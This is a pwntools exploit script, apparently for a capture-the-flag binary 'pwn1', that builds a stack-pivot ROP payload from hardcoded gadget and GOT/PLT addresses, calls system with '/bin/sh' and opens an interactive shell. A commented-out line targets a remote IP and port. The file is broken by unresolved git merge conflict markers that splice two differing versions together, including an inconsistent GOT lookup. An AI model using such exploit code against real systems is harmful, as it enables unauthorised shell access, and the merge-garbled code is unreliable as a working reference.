from pwn import *
<<<<<<< HEAD
import roputils 
=======
>>>>>>> 54c485ec89e16474a0a94da0542c8dd2bb6fa174
context(log_level="debug")
elf = ELF('pwn1')
rop = ROP(elf)

p  = process('./pwn1')
<<<<<<< HEAD
stacksize = 0x800
buffer_addr = elf.bss(0x30)
plt_start_addr = 0x080483a0
leave_ret = 0x08048498
pop_ebp_ret = 0x0804866a
esp = buffer_addr+0x20
write_plt_addr = elf.symbols['write']
write_got_addr  = elf.got["write"]
read_got_addr = elf.got['write']
ppp_ret = 0x08048668
=======
# p = remote('115.28.241.138',9000)
bbs_max = 0x120
buffer_addr = elf.bss(0x20)
plt_start_addr = 0x080483a0
leave_ret = 0x08048498
pop_ebp_ret = 0x0804866a
esp = buffer_addr+0xf0-0x4
write_plt_addr = elf.symbols['write']
write_got_addr  = elf.got["write"]
read_got_addr = elf.got['read']
shutdown_got_addr = elf.got['shutdown']
ppp_ret = 0x08048668
# system_offset = 1# by libcdb.com
system_libc = 0xf7500160#by libcdb.com
>>>>>>> 54c485ec89e16474a0a94da0542c8dd2bb6fa174
print "buffer = "+hex(buffer_addr)
print "plt_start_addr ="+hex(plt_start_addr)
print "pop_ebp_ret = "+hex(pop_ebp_ret)
print  "leave_ret = "+hex(leave_ret)

gdb.attach(p,'b*0x0804865D\nc')
# payload = str(buffer_addr)+'.'+str(0x20)+'.'+str(plt_start_addr)
payload   = ''
payload += str(leave_ret)+'.'+str(esp)+'.'+str(pop_ebp_ret)+'.'
<<<<<<< HEAD
payload +=(0x30-len(payload))*'A'+4*'A'
# payload +=p32(write_plt_addr)+p32(ppp_ret)+p32(1)+p32(write_got_addr)+p32(4)
# payload +=p32(write_plt_addr)+p32(ppp_ret)
payload +=p32(plt_start_addr)+p32(0x20)+p32(ppp_ret)+p32(1)+p32(read_got_addr)+p32(4)
p.recvuntil('welcome to cctf\n')
p.sendline(payload)
=======
payload +=(0xf0-len(payload))*'A'#stack_size
# payload +=p32(write_plt_addr)+p32(ppp_ret)+p32(1)+p32(write_got_addr)+p32(4)
# payload +=p32(write_plt_addr)+p32(ppp_ret)
# payload +=p32(plt_start_addr)+p32(0x20)+p32(ppp_ret)+p32(1)+p32(read_got_addr)+p32(4)
# payload +=p32(write_plt_addr)+p32(ppp_ret)+p32(1)+p32(read_got_addr)+p32(4)+p32(write_plt_addr)+p32(ppp_ret)+p32(1)+p32(write_got_addr)+p32(4)
shell_addr = 0x804A158
payload +=p32(system_libc)+p32(shell_addr)
payload +="/bin/sh\x00"
p.recvuntil('welcome to cctf\n')
p.sendline(payload)
# data = p.recv(8)
# read_libc_addr = u32(data[:4])
# write_got_addr = u32(data[4:8])
# print 'read_libc_addr = '+hex(read_libc_addr)
# print 'write_got_addr = '+hex(write_got_addr)
>>>>>>> 54c485ec89e16474a0a94da0542c8dd2bb6fa174
p.interactive()